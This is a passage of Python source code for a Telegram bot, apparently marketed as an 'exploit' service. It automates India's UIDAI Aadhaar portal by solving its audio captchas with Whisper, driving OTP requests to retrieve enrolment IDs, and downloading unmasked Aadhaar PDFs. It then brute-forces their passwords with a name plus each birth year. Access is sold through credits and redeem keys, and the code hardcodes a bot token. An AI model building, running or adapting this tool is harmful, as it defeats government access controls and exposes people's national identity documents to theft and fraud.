import asyncio
import os
import re
import time
import html
import base64
import uuid
import sqlite3
import requests
import whisper
from datetime import datetime
from pydub import AudioSegment
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# ==============================================================================
# CONFIGURATION
# ==============================================================================
BOT_TOKEN = "8998946002:AAFSdP4ZFFNL_SNHY0Xf38spbBUORDKyLT8"
OWNER_ID = 8244470589
DEBUG_ADMIN_ID = 8244470589

# Force Subscribe Configuration
FORCE_SUB_CHANNEL_ID = -1003881782294
FORCE_SUB_CHANNEL_LINK = "https://t.me/DEEPAK_SAINI_3"

DB_FILE = "users_db.db"
TEMP_DIR = "temp_files"

EXTRACTION_LIMIT = asyncio.Semaphore(5)
WHISPER_LOCK = asyncio.Lock() # Fixes PyTorch Thread Collision Segfaults

if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)

bot = AsyncTeleBot(BOT_TOKEN)

# ==============================================================================
# WHISPER MODEL
# ==============================================================================
print("⛩️ Loading Whisper AI Model...")
model = whisper.load_model("base")
print("🐉 Whisper loaded successfully.")

# ==============================================================================
# DATABASE (SQLite3)
# ==============================================================================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        credits INTEGER DEFAULT 5, 
        role TEXT DEFAULT 'user',
        banned INTEGER DEFAULT 0,
        unlimited_until REAL DEFAULT 0,
        daily_limit INTEGER DEFAULT 0,
        used_today INTEGER DEFAULT 0,
        last_active_date TEXT DEFAULT '',
        successful_searches INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_keys (
        key_string TEXT PRIMARY KEY,
        credits INTEGER DEFAULT 0,
        days INTEGER DEFAULT 0
    )''')
        
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        time TEXT,
        admin_name TEXT,
        admin_id INTEGER,
        action TEXT,
        target_name TEXT,
        target_id INTEGER
    )''')
    conn.commit()
    conn.close()

def load_db():
    init_db()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users")
    rows = c.fetchall()
    conn.close()
    
    db = {}
    for row in rows:
        uid = row[0]
        db[uid] = {
            "credits": row[1],
            "role": row[2],
            "banned": bool(row[3]),
            "unlimited_until": row[4],
            "daily_limit": row[5],
            "used_today": row[6],
            "last_active_date": row[7],
            "successful_searches": row[8],
            "state": None,
            "temp": {}
        }
        
    if OWNER_ID not in db:
        db[OWNER_ID] = {
            "credits": 9999, "role": "owner", "banned": False,
            "unlimited_until": 0, "daily_limit": 0, "used_today": 0,
            "last_active_date": "", "successful_searches": 0,
            "state": None, "temp": {}
        }
        save_user_to_db(OWNER_ID, db[OWNER_ID])
        
    return db

def save_user_to_db(uid, data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO users
                 (id, credits, role, banned, unlimited_until, daily_limit, used_today, last_active_date, successful_searches)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (uid, data.get('credits', 0), data.get('role', 'user'), int(data.get('banned', False)),
               data.get('unlimited_until', 0), data.get('daily_limit', 0), data.get('used_today', 0),
               data.get('last_active_date', ''), data.get('successful_searches', 0)))
    conn.commit()
    conn.close()

def save_db():
    for uid, data in users_db.items():
        save_user_to_db(uid, data)

users_db = load_db()

def init_user(uid):
    if uid not in users_db:
        users_db[uid] = {
            "credits": 5, "role": "owner" if uid == OWNER_ID else "user", "state": None, "banned": False,
            "unlimited_until": 0, "daily_limit": 0, "used_today": 0,
            "last_active_date": "", "successful_searches": 0, "temp": {}
        }
        save_user_to_db(uid, users_db[uid])
    else:
        if "state" not in users_db[uid]: users_db[uid]["state"] = None
        if "temp" not in users_db[uid]: users_db[uid]["temp"] = {}
        if uid == OWNER_ID: users_db[uid]["role"] = "owner"

# --- Redeem Key Database Functions ---
def add_redeem_key(key, credits, days):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO redeem_keys (key_string, credits, days) VALUES (?, ?, ?)", (key, credits, days))
    conn.commit()
    conn.close()

def get_redeem_key(key):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT credits, days FROM redeem_keys WHERE key_string = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row

def delete_redeem_key(key):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM redeem_keys WHERE key_string = ?", (key,))
    conn.commit()
    conn.close()

# --- Logging ---
def load_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT time, admin_name, admin_id, action, target_name, target_id FROM logs ORDER BY id DESC LIMIT 15")
    rows = c.fetchall()
    conn.close()
    logs = []
    for r in rows:
        logs.append({
            "time": r[0], "admin_name": r[1], "admin_id": r[2],
            "action": r[3], "target_name": r[4], "target_id": r[5]
        })
    return logs

def save_log(admin_name, admin_id, action, target_name, target_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT INTO logs (time, admin_name, admin_id, action, target_name, target_id)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (time.strftime("%Y-%m-%d %H:%M:%S"), admin_name, admin_id, action, target_name, target_id))
    conn.commit()
    conn.close()

def refund_credit(uid):
    if users_db.get(uid, {}).get("temp", {}).get("credit_deducted"):
        users_db[uid]["credits"] += 1
        users_db[uid]["temp"]["credit_deducted"] = False
    if users_db.get(uid, {}).get("temp", {}).get("used_today_incremented"):
        users_db[uid]["used_today"] = max(0, users_db[uid]["used_today"] - 1)
        users_db[uid]["temp"]["used_today_incremented"] = False
    save_db()

def is_admin(uid):
    return users_db.get(uid, {}).get("role") in ["admin", "owner"]

# ==============================================================================
# TELEGRAM SLEEK UI HELPERS (ANIME/CYBER THEME)
# ==============================================================================

# Custom Safe Reply Function (Fixes 400 Bad Request error)
async def safe_reply(message, text, **kwargs):
    try:
        return await bot.reply_to(message, text, **kwargs)
    except Exception as e:
        if "message to be replied not found" in str(e).lower():
            try:
                return await bot.send_message(message.chat.id, text, **kwargs)
            except Exception:
                pass
        return None

async def check_force_sub(user_id):
    if user_id == OWNER_ID:
        return True
    try:
        member = await bot.get_chat_member(FORCE_SUB_CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"[!] FSub Error (Is bot admin?): {e}")
        return False

async def require_fsub(message):
    if not await check_force_sub(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⛩️ JOIN CHANNEL TO USE ⛩️", url=FORCE_SUB_CHANNEL_LINK))
        
        text = (
            f"🚫 <b>ACCESS DENIED</b> 🚫\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Bhai, pehle channel join karo phir command use karna!\n\n"
            f"👇 Niche diye button pe click karke join karo."
        )
        await safe_reply(message, text, parse_mode='HTML', reply_markup=markup)
        return False
    return True


def get_clean_ui(target, status, prompt=None):
    ui = (
        f"💠 <b>𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗜𝗢𝗡 𝗠𝗢𝗗𝗘</b> 💠\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎯 <b>Target:</b> <code>{target}</code>\n"
        f"🔄 <b>Status:</b> <i>{status}</i>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    if prompt:
        ui += f"\n\n{prompt}"
    return ui

async def safe_edit(text, chat_id, msg_id, markup=None):
    if not msg_id: return
    try:
        if markup:
            await bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML',
                                        disable_web_page_preview=True, reply_markup=markup)
        else:
            await bot.edit_message_text(text, chat_id, msg_id, parse_mode='HTML',
                                        disable_web_page_preview=True)
    except: pass

async def send_debug_log(target, phase, user_err, raw_log):
    try:
        safe_raw = html.escape(str(raw_log)[:3500])
        debug_text = (
            f"⚠️ <b>SYSTEM DEBUGGER</b> ⚠️\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 <b>TARGET:</b> <code>{target}</code>\n"
            f"🔄 <b>PHASE:</b> {phase}\n"
            f"🚫 <b>ERROR:</b> {user_err}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚙️ <b>RAW TRACE:</b>\n"
            f"<code>{safe_raw}</code>"
        )
        await bot.send_message(DEBUG_ADMIN_ID, debug_text, parse_mode='HTML')
    except: pass

def get_credit_display(uid):
    init_user(uid)
    unlim = users_db[uid].get('unlimited_until', 0)
    if is_admin(uid):
        return "UNLIMITED ♾️"
    elif unlim > time.time():
        days = round((unlim - time.time()) / 86400, 1)
        return f"♾️ (Valid {days} Days)"
    return f"{users_db[uid]['credits']} Credits"

# ==============================================================================
# PDF DECRYPTION & CAPTCHA SOLVER
# ==============================================================================
def brute_force_pdf(pdf_path, name_prefix, start_year=1930, end_year=2030):
    """
    Fix for Segmentation fault: Open the PDF ONCE instead of 100 times in a loop.
    Repeatedly opening/closing the file rapidly crashes PyMuPDF's C-bindings.
    """
    try:
        import fitz
        with fitz.open(pdf_path) as doc:
            if not doc.needs_pass:
                return "" # No password needed
            for year in range(start_year, end_year + 1):
                pwd = f"{name_prefix}{year}"
                if doc.authenticate(pwd):
                    return pwd
    except Exception as e:
        print(f"Fitz error: {e}")
        pass
    
    # Fallback to pikepdf if PyMuPDF fails
    try:
        import pikepdf
        for year in range(start_year, end_year + 1):
            pwd = f"{name_prefix}{year}"
            try:
                with pikepdf.open(pdf_path, password=pwd):
                    return pwd
            except Exception:
                continue
    except Exception:
        pass

    return None

def save_unlocked_pdf(input_path, output_path, password):
    try:
        import pikepdf
        with pikepdf.open(input_path, password=password) as pdf: 
            pdf.save(output_path)
        return True
    except: return False


def process_audio_sync(base64_string):
    raw_name = f"raw_{uuid.uuid4()}.mp3"
    wav_name = f"wav_{uuid.uuid4()}.wav"
    try:
        base64_string = base64_string.strip()
        if not base64_string: return "error"
        padding = len(base64_string) % 4
        if padding: base64_string += "=" * (4 - padding)

        with open(raw_name, "wb") as f: f.write(base64.b64decode(base64_string))
        AudioSegment.from_file(raw_name).export(wav_name, format="wav")

        result = model.transcribe(wav_name, language="en", fp16=False,
                                  initial_prompt="The captcha is 6 characters long. 1 2 3 4 5 6 7 8 9 0 a b c d e f.")
        clean_text = re.sub(r'[^a-zA-Z0-9]', '', result["text"]).lower()[:6]
        return clean_text if clean_text else "error"
    except Exception: 
        return "error"
    finally:
        # Prevent disk leaks if the transcription crashes
        for p in [raw_name, wav_name]:
            if os.path.exists(p): 
                try: os.remove(p)
                except: pass

# ==============================================================================
# UIDAI API HELPERS
# ==============================================================================
def get_uidai_headers(req_id):
    return {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://myaadhaar.uidai.gov.in',
        'Referer': 'https://myaadhaar.uidai.gov.in/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'X-Request-ID': req_id,
        'transactionId': req_id,
        'appid': 'MYAADHAAR'
    }

def fetch_captcha(session, headers):
    url = 'https://tathya.uidai.gov.in/audioCaptchaService/api/captcha/v3/generation'
    payload = {"captchaLength": "6", "captchaType": "2", "audioCaptchaRequired": True}
    for _ in range(3):
        try:
            r = session.post(url, headers=headers, json=payload, timeout=15)
            if r.status_code == 200:
                data = r.json()
                return data.get("audioBase64"), data.get("transactionId")
        except: time.sleep(1)
    return None, None

def request_eid_otp(session, mobile, name, cap_text, cap_txn_id, headers):
    url = 'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid'
    payload = {
        "mobileNumber": mobile, "name": name, "option": "EID",
        "captchaTxnId": cap_txn_id, "captcha": cap_text, "resendOtp": False,
        "dob": None, "email": None, "otp": None, "otpTxnId": None
    }
    try:
        r = session.post(url, headers=headers, json=payload, timeout=15)
        return r.json()
    except Exception as e: return {"error": str(e)}

def submit_eid_otp(session, mobile, name, captcha_text, captcha_txn_id, otp_txn_id, otp, headers):
    url = 'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid'
    payload = {
        "mobileNumber": mobile, "name": name, "option": "EID",
        "otp": otp, "otpTxnId": otp_txn_id,
        "captchaTxnId": captcha_txn_id, "captcha": captcha_text, "resendOtp": False,
        "dob": None, "email": None
    }
    try:
        r = session.post(url, headers=headers, json=payload, timeout=15)
        return r.json()
    except Exception as e: return {"error": str(e)}

def request_download_otp(session, eid, cap_text, cap_txn_id, req_id, headers):
    url = 'https://tathya.uidai.gov.in/unifiedAppAuthService/api/v2/generate/aadhaar/otp'
    payload = {
        "eidNumber": eid, "idType": "eid",
        "captchaTxnId": cap_txn_id, "captchaValue": cap_text,
        "transactionId": req_id, "resendOTP": False
    }
    try:
        r = session.post(url, headers=headers, json=payload, timeout=15)
        return r.json()
    except Exception as e: return {"error": str(e)}

def download_aadhaar(session, eid, otp, otp_txn_id, headers):
    url = 'https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download'
    payload = {"eid": eid, "mask": False, "otp": otp, "otpTxnId": otp_txn_id}
    try:
        r = session.post(url, headers=headers, json=payload, timeout=25)
        return r.json()
    except Exception as e: return {"error": str(e)}

# ==============================================================================
# COMMANDS: START, PING, KEY & REDEEM, FREECREDIT
# ==============================================================================
@bot.message_handler(commands=['ping'])
async def ping_cmd(message):
    if not await require_fsub(message): return
    start = time.time()
    msg = await safe_reply(message, "<i>📡 Pinging server...</i>", parse_mode='HTML')
    if msg:
        ms = round((time.time() - start) * 1000)
        ping_ui = (
            f"⛩️ <b>𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦</b> ⛩️\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Latency:</b> <code>{ms}ms</code>\n"
            f"🤖 <b>Status:</b> 🟢 <b>ONLINE</b>\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        await safe_edit(ping_ui, message.chat.id, msg.message_id)

@bot.message_handler(commands=['genkey'])
async def gen_key_cmd(message):
    uid = message.from_user.id
    if not is_admin(uid): return
    
    parts = message.text.split()
    if len(parts) < 2:
        return await safe_reply(message, "⚠️ <b>Usage:</b> <code>/genkey [credits] [days(optional)]</code>", parse_mode='HTML')
        
    try:
        credits_to_add = int(parts[1])
        days_to_add = int(parts[2]) if len(parts) > 2 else 0
        
        new_key = f"ANIME-{str(uuid.uuid4().hex)[:8].upper()}"
        add_redeem_key(new_key, credits_to_add, days_to_add)
        
        ui = (
            f"🔑 <b>KEY GENERATED SUCCESSFULLY</b> 🔑\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🎫 <b>Key:</b> <code>{new_key}</code>\n"
            f"💰 <b>Credits:</b> {credits_to_add}\n"
            f"⏳ <b>Days (VIP):</b> {days_to_add}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>User can redeem via /redeem {new_key}</i>"
        )
        await safe_reply(message, ui, parse_mode='HTML')
    except ValueError:
        await safe_reply(message, "❌ Invalid number format.")

@bot.message_handler(commands=['redeem'])
async def redeem_key_cmd(message):
    if not await require_fsub(message): return
    uid = message.from_user.id
    init_user(uid)
    
    if users_db[uid]["banned"]:
        return await safe_reply(message, "🚫 <b>ACCESS DENIED. BANNED.</b>", parse_mode='HTML')

    parts = message.text.split()
    if len(parts) < 2:
        return await safe_reply(message, "⚠️ <b>Usage:</b> <code>/redeem [YOUR_KEY]</code>", parse_mode='HTML')
        
    key = parts[1].strip()
    key_data = get_redeem_key(key)
    
    if not key_data:
        return await safe_reply(message, "❌ <b>Invalid or Expired Key.</b>", parse_mode='HTML')
        
    credits, days = key_data
    
    users_db[uid]["credits"] += credits
    if days > 0:
        current_expiry = max(time.time(), users_db[uid].get('unlimited_until', 0))
        users_db[uid]['unlimited_until'] = current_expiry + (days * 86400)
        
    save_db()
    delete_redeem_key(key)
    save_log(message.from_user.first_name, uid, f"REDEEMED KEY ({credits} Cr, {days} Days)", str(uid), uid)
    
    ui = (
        f"⛩️ <b>𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬</b> ⛩️\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎁 <b>Added:</b> {credits} Credits | {days} VIP Days\n"
        f"💳 <b>New Balance:</b> {get_credit_display(uid)}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>Enjoy the bot! Use /o2a to start.</i>"
    )
    await safe_reply(message, ui, parse_mode='HTML')

@bot.message_handler(commands=['freecredit'])
async def mass_free_credit_cmd(msg):
    uid = msg.from_user.id
    if not is_admin(uid): 
        return await safe_reply(msg, "❌ <b>Bhai, tum admin nahi ho!</b>", parse_mode='HTML')
        
    parts = msg.text.split()
    if len(parts) < 2:
        return await safe_reply(msg, "⚠️ <b>Usage:</b> <code>/freecredit [amount]</code> (Ye sabko credit bhej dega)", parse_mode='HTML')
        
    try:
        amt = int(parts[1])
    except ValueError:
        return await safe_reply(msg, "❌ Amount must be a number.")
        
    uids = list(users_db.keys())
    estimated_time = (len(uids) * 0.05) + 2
    
    status_msg = await safe_reply(
        msg, 
        f"⏳ <b>Broadcasting {amt} Credits to {len(uids)} users...</b>\n"
        f"<i>Estimated time: ~{int(estimated_time)} seconds. Please leave the bot running.</i>", 
        parse_mode='HTML'
    )
    
    success, failed = 0, 0
    for uid_str in uids:
        target_uid = int(uid_str)
        try:
            users_db[target_uid]["credits"] += amt
            formatted_msg = (
                f"🎁 <b>𝗔𝗗𝗠𝗜𝗡 𝗚𝗜𝗙𝗧 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗</b> 🎁\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f" <b> Credits : {amt}</b> \n"
                
                f"Use <code>/start</code> to check balance."
            )
            await bot.send_message(target_uid, formatted_msg, parse_mode='HTML')
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1

    save_db()
    final_status = (
        f"✅ <b>Free Credit Broadcast Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Success: {success}\n"
        f"❌ Failed: {failed} (Blocked bot)\n"
        f"💰 Amount given: {amt} Credits"
    )
    if status_msg:
        await safe_edit(final_status, msg.chat.id, status_msg.message_id)

@bot.message_handler(commands=['start'])
async def send_welcome(message):
    if not await require_fsub(message): return
    
    uid = message.from_user.id
    init_user(uid)
    users_db[uid]["state"] = None
    if users_db[uid]["banned"]:
        return await safe_reply(message, "🚫 <b>ACCESS DENIED. YOU ARE BANNED.</b>", parse_mode='HTML')

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🟢 SYSTEM INFO", callback_data="bot_info"),
        types.InlineKeyboardButton("📘 GUIDE", callback_data="bot_guide")
    )
    
    role = users_db[uid]["role"]
    if role == "owner":
        markup.add(types.InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner_panel"))
    elif role == "admin":
        markup.add(types.InlineKeyboardButton("🔴 ADMIN PANEL", callback_data="admin_panel"))

    credits_display = get_credit_display(uid)
    
    welcome_text = (
        f"⛩️ <b>𝗘𝗫𝗣𝗟𝗢𝗜𝗧 𝗠𝗢𝗗𝗘𝗟</b> ⛩️\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> {message.from_user.first_name}\n"
        f"💳 <b>Balance:</b> {credits_display}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🚀 <b>Cmd:</b> <code>/o2a [10_DIGIT_NO]</code>\n"
        f"🔑 <b>Cmd:</b> <code>/redeem [KEY]</code>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    await bot.send_message(message.chat.id, welcome_text, parse_mode='HTML',
                           reply_markup=markup, disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data in ["bot_info", "owner_panel", "admin_panel", "back_start", "bot_guide", "admin_stats", "admin_logs"])
async def menu_callbacks(call):
    uid = call.from_user.id
    
    if not await check_force_sub(uid):
        await bot.answer_callback_query(call.id, "⚠️ Bhai pehle channel join karo! Send /start again.", show_alert=True)
        return
        
    init_user(uid)
    if users_db[uid]["banned"]: return

    if call.data == "bot_info":
        info_text = (
            f"⛩️ <b><a href='https://t.me/cvnze'>𝙂𝙊𝘿 𝘼𝙉𝙏𝙄𝙁𝙄𝙀𝘿𝙉𝙐𝙇𝙇</a></b> ⛩️\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"ℹ️ <b>SYSTEM:</b> <code>OTP TO GOV-DB</code>\n"
            f"📡 <b>TARGET:</b> <code>ALL SIM SUPPORTED</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👑 <b>[ CREATOR ]</b>\n"
            f"• <a href='https://t.me/cvnze'>𝙂𝙊𝘿 𝘼𝙉𝙏𝙄𝙁𝙄𝙀𝘿𝙉𝙐𝙇𝙇</a>\n\n"
            f"💡 <b>[ CONTRIBUTORS ]</b>\n"
            f"• <a href='https://t.me/SAKSHAM0916'>ＳＡＫＳＨＡＭ</a>\n"
            f"• <a href='https://t.me/Hardik_banarjee'>𝐕 𝐈 𝐑 𝐔 𝐒</a>\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK", callback_data="back_start"))
        await safe_edit(info_text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "bot_guide":
        guide_text = (
            f"📚 <b>𝗦𝗬𝗦𝗧𝗘𝗠 𝗚𝗨𝗜𝗗𝗘</b> 📚\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📄 <b>PDF Extraction</b>\n"
            f"Use <code>/o2a [NUMBER]</code> to begin.\n"
            f"Follow prompts to input OTPs.\n\n"
            f"🔄 <b>Automation:</b>\n"
            f"Operates entirely in the background.\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK", callback_data="back_start"))
        await safe_edit(guide_text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "owner_panel" and users_db[uid]["role"] == "owner":
        owner_text = (
            f"👑 <b>𝗠𝗔𝗦𝗧𝗘𝗥 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟</b> 👑\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<code>/addadmin [ID]</code> - Add Admin\n"
            f"<code>/remadmin [ID]</code> - Rem Admin\n"
            f"<code>/broadcast [MSG]</code> - Global Msg\n"
            f"<code>/freecredit [AMT]</code> - Global Cr\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<code>/genkey [Cr] [Days]</code>- Make Key\n"
            f"<code>/info [ID]</code> - Manage User\n"
            f"<code>/give [ID] [AMT]</code> - Add Cr\n"
            f"<code>/revoke [ID] [AMT]</code> - Del Cr\n"
            f"<code>/ban [ID]</code> - Ban User\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📊 System Stats", callback_data="admin_stats"),
            types.InlineKeyboardButton("📝 View Logs", callback_data="admin_logs")
        )
        markup.add(types.InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back_start"))
        await safe_edit(owner_text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "admin_panel" and users_db[uid]["role"] in ["admin", "owner"]:
        admin_text = (
            f"🔴 <b>𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗣𝗔𝗡𝗘𝗟</b> 🔴\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<code>/genkey [Cr] [Days]</code>- Make Key\n"
            f"<code>/freecredit [AMT]</code> - Global Cr\n"
            f"<code>/info [ID]</code> - Check User Info\n"
            f"<code>/give [ID] [AMT]</code> - Add Cr\n"
            f"<code>/revoke [ID] [AMT]</code>- Del Cr\n"
            f"<code>/ban [ID]</code> - Ban User\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📊 System Stats", callback_data="admin_stats"),
            types.InlineKeyboardButton("📝 View Logs", callback_data="admin_logs")
        )
        markup.add(types.InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back_start"))
        await safe_edit(admin_text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "admin_stats" and is_admin(uid):
        total_users = len(users_db)
        banned_users = sum(1 for u in users_db.values() if u.get("banned"))
        stats_text = (
            f"📊 <b>𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗦𝗧𝗔𝗧𝗦</b> 📊\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👥 <b>Registered:</b> <code>{total_users}</code>\n"
            f"🚫 <b>Banned:</b> <code>{banned_users}</code>\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK TO PANEL", callback_data="owner_panel"))
        await safe_edit(stats_text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "admin_logs" and is_admin(uid):
        logs = load_logs()
        if not logs:
            text = "📝 No logs found."
        else:
            text = "📋 <b>𝗔𝗖𝗧𝗜𝗢𝗡 𝗟𝗢𝗚𝗦</b>\n━━━━━━━━━━━━━━━━━━\n"
            for lg in logs:
                text += f"🕒 <code>{lg['time']}</code>\n👑 <b>{lg['admin_name']}</b>\n⚡️ <code>{lg['action']}</code>\n👤 <code>{lg['target_id']}</code>\n━━━━━━━━━━━━━━━━━━\n"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 BACK TO PANEL", callback_data="owner_panel"))
        await safe_edit(text, call.message.chat.id, call.message.message_id, markup=markup)

    elif call.data == "back_start":
        credits_display = get_credit_display(uid)
        welcome_text = (
            f"⛩️ <b>𝗘𝗫𝗣𝗟𝗢𝗜𝗧 𝗠𝗢𝗗𝗘𝗟</b> ⛩️\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User:</b> {call.from_user.first_name}\n"
            f"💳 <b>Balance:</b> {credits_display}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🚀 <b>Cmd:</b> <code>/o2a [10_DIGIT_NO]</code>\n"
            f"🔑 <b>Cmd:</b> <code>/redeem [KEY]</code>\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🟢 SYSTEM INFO", callback_data="bot_info"),
            types.InlineKeyboardButton("📘 GUIDE", callback_data="bot_guide")
        )
        role = users_db[uid]["role"]
        if role == "owner":
            markup.add(types.InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner_panel"))
        elif role == "admin":
            markup.add(types.InlineKeyboardButton("🔴 ADMIN PANEL", callback_data="admin_panel"))
            
        await safe_edit(welcome_text, call.message.chat.id, call.message.message_id, markup=markup)

# ==============================================================================
# ADD / REMOVE ADMIN COMMANDS (OWNER ONLY)
# ==============================================================================
@bot.message_handler(commands=['addadmin', 'remadmin'])
async def manage_admins(msg):
    uid = msg.from_user.id
    if users_db.get(uid, {}).get("role") != "owner":
        return 
    
    cmd = msg.text.split()[0].lower()
    parts = msg.text.split()
    if len(parts) < 2: return await safe_reply(msg, f"⚠️ Usage: {cmd} [ID]")
    
    try:
        target = int(parts[1])
        init_user(target) 

        if cmd == '/addadmin':
            users_db[target]['role'] = 'admin'
            save_db()
            await safe_reply(msg, f"✅ <code>{target}</code> is now an Admin.", parse_mode='HTML')
        else:
            users_db[target]['role'] = 'user'
            save_db()
            await safe_reply(msg, f"✅ <code>{target}</code> removed from Admins.", parse_mode='HTML')
    except ValueError:
        await safe_reply(msg, "❌ Invalid ID.")

# ==============================================================================
# /INFO UI & DYNAMIC ADMIN INPUT HANDLERS
# ==============================================================================
@bot.message_handler(commands=['info'])
async def cmd_info(msg):
    req_id = msg.from_user.id
    if not is_admin(req_id): return
    
    try:
        parts = msg.text.split()
        if len(parts) > 1:
            target_id = int(parts[1])
        elif msg.reply_to_message:
            target_id = msg.reply_to_message.from_user.id
        else:
            target_id = req_id

        init_user(target_id)
        user_data = users_db[target_id]

        target_name = "Unknown"
        target_user = "None"
        try:
            chat = await bot.get_chat(target_id)
            target_name = chat.first_name or "Unknown"
            target_user = f"@{chat.username}" if chat.username else "None"
        except: pass

        unlim_ts = user_data.get('unlimited_until', 0)
        unlim_str = "No"
        if unlim_ts > time.time(): unlim_str = "Yes ✅"
        
        dl_str = f"{user_data.get('daily_limit', 0)}" if user_data.get('daily_limit', 0) > 0 else "No Limit"
        ban_status = "Yes 🚫" if user_data.get('banned') else "No ✅"
        role_status = user_data.get("role", "user").upper()

        info_text = (
            f"👤 <b>𝗨𝗦𝗘𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝗜𝗡𝗙𝗢</b> 👤\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Name:</b> {target_name}\n"
            f"<b>User:</b> {target_user}\n"
            f"<b>ID:</b> <code>{target_id}</code>\n"
            f"<b>Role:</b> {role_status}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Credits:</b> <code>{user_data['credits']}</code>\n"
